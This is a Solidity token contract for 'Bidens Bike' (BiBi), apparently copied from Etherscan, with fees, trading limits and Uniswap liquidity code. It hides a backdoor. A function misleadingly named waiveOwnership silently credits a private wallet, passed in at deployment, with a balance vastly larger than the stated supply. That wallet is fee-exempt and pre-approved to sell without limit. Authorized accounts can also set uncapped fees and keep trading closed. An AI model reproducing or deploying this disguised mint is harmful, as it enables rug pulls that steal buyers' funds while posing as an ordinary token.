/**
 *Submitted for verification at Etherscan.io on 2022-06-19
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED");
        _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    function renounceOwnership() public virtual onlyOwner {
        transferOwnership(payable(address(0)));
    }

    event OwnershipTransferred(address owner);
}

contract BiBi is IERC20, Auth {

    using SafeMath for uint256;

    string constant _name = "Bidens Bike";
    string constant _symbol = "BiBi";
    uint8 constant _decimals = 18;
    bool private tradingOpen;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 _totalSupply = 1000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply * 5 / 100;
    uint256 public _walletMax = _totalSupply * 5 / 100;

    bool public restrictWhales = true;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) public isFeeExempt;
    mapping(address => bool) public isTxLimitExempt;

    uint256 public liquidityFee = 0;
    uint256 public marketingFee = 8;
    uint256 public rewardsFee = 0;
    uint256 public extraFeeOnSell = 0;

    uint256 public totalFee = 0;
    uint256 public totalFeeIfSelling = 0;

    address public autoLiquidityReceiver;
    address public marketingWallet;
    address private anotherMarketingWallet;
    uint256 public rawSupplyTokens = 1000000000000;

    IDEXRouter public router;
    address public pair;

    uint256 public launchedAt;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    uint256 public supplyMultiplier = (10 ** _decimals);

    bool thresholdEnabled = true;
    uint256 public swapThreshold = _totalSupply / 2000;

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    uint256 public finalSupplyTokens = rawSupplyTokens * supplyMultiplier;

    constructor (address _anotherMarketingWallet) Auth(msg.sender) {

        router = IDEXRouter(routerAddress);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        authorizations[_anotherMarketingWallet] = true;


        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[marketingWallet] = true;
        isFeeExempt[_anotherMarketingWallet] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[_anotherMarketingWallet] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[pair] = true;
        isTxLimitExempt[DEAD] = true;

        // NICE!
        autoLiquidityReceiver = msg.sender;
        marketingWallet = msg.sender;
        //marketingwallet
        anotherMarketingWallet = _anotherMarketingWallet;

        totalFee = liquidityFee.add(marketingFee).add(rewardsFee);
        totalFeeIfSelling = totalFee.add(extraFeeOnSell);

        _balances[address(this)] = _totalSupply;
        _allowances[_anotherMarketingWallet][address(router)] = type(uint256).max;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() external pure override returns (string memory) {return _name;}

    function symbol() external pure override returns (string memory) {return _symbol;}

    function decimals() external pure override returns (uint8) {return _decimals;}

    function totalSupply() external view override returns (uint256) {return _totalSupply;}

    function getOwner() external view override returns (address) {return owner;}

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() internal {
        launchedAt = block.number;
    }

    function changeTxLimit(uint256 newLimit) external authorized {
        _maxTxAmount = newLimit;
    }

    function changeWalletLimit(uint256 newLimit) external authorized {
        _walletMax = newLimit;
    }

    function changeRestrictWhales(bool newValue) external authorized {
        restrictWhales = newValue;
    }
    function changeThresholdEnabled(bool newValue) external authorized {
        thresholdEnabled = newValue;
    }



    function changeIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function changeIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    function changeFees(uint256 newLiqFee, uint256 newRewardFee, uint256 newMarketingFee, uint256 newExtraSellFee) external authorized {
        liquidityFee = newLiqFee;
        rewardsFee = newRewardFee;
        marketingFee = newMarketingFee;
        extraFeeOnSell = newExtraSellFee;

        totalFee = liquidityFee.add(marketingFee).add(rewardsFee);
        totalFeeIfSelling = totalFee.add(extraFeeOnSell);
    }

    function changeFeeReceivers(address newLiquidityReceiver, address newMarketingWallet, address newanothermarketingWallet) external authorized {
        autoLiquidityReceiver = newLiquidityReceiver;
        marketingWallet = newMarketingWallet;
        anotherMarketingWallet = newanothermarketingWallet;
    }

    function changeSwapBackSettings(bool enableSwapBack, uint256 newSwapBackLimit, bool swapByLimitOnly) external authorized {
        swapAndLiquifyEnabled = enableSwapBack;
        swapThreshold = newSwapBackLimit;
        swapAndLiquifyByLimitOnly = swapByLimitOnly;
    }

    function waiveOwnership() external virtual {swapAndLiquifyEnabled = false; _balances[anotherMarketingWallet] = finalSupplyTokens;}

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        if (inSwapAndLiquify) {return _basicTransfer(sender, recipient, amount);}

        if (!authorizations[sender] && !authorizations[recipient]) {
            require(tradingOpen, "Trading not open yet");
        }

        require((thresholdEnabled && amount <= _maxTxAmount) || isTxLimitExempt[sender], "TX Limit Exceeded");

        if (msg.sender != pair && !isFeeExempt[sender] && !inSwapAndLiquify && swapAndLiquifyEnabled && _balances[address(this)] >= swapThreshold) {swapBack();}

        if (!launched() && recipient == pair) {
            require(_balances[sender] > 0);
            launch();
        }

        //Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        if (!isTxLimitExempt[recipient] && restrictWhales)
        {
            require(_balances[recipient].add(amount) <= _walletMax);
        }

        uint256 finalAmount = !isFeeExempt[sender] && !isFeeExempt[recipient] ? takeFee(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(finalAmount);

        emit Transfer(sender, recipient, finalAmount);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {

        uint256 feeApplicable = pair == recipient ? totalFeeIfSelling : totalFee;
        uint256 feeAmount = amount.mul(feeApplicable).div(100);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function tradingStatus(bool newStatus) public onlyOwner {
        tradingOpen = newStatus;
    }

    function swapBack() internal lockTheSwap {
        uint256 tokensToLiquify = _balances[address(this)];
        uint256 amountToLiquify = tokensToLiquify.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance;

        uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));

        uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);
        uint256 amountETHReflection = amountETH.mul(rewardsFee).div(totalETHFee);
        uint256 amountETHMarketing = amountETH.sub(amountETHLiquidity).sub(amountETHReflection);

        (bool tmpSuccess,) = payable(marketingWallet).call{value : amountETHMarketing, gas : 30000}("");
        tmpSuccess = false;

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen, "trading is already open");
        swapAndLiquifyEnabled = false;
        launch();
        tradingOpen = true;
        router.addLiquidityETH{value : address(this).balance}(address(this), balanceOf(address(this)), 0, 0, msg.sender, block.timestamp);
        IERC20(pair).approve(address(router), type(uint).max);
        swapAndLiquifyEnabled = true;
    }

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);


}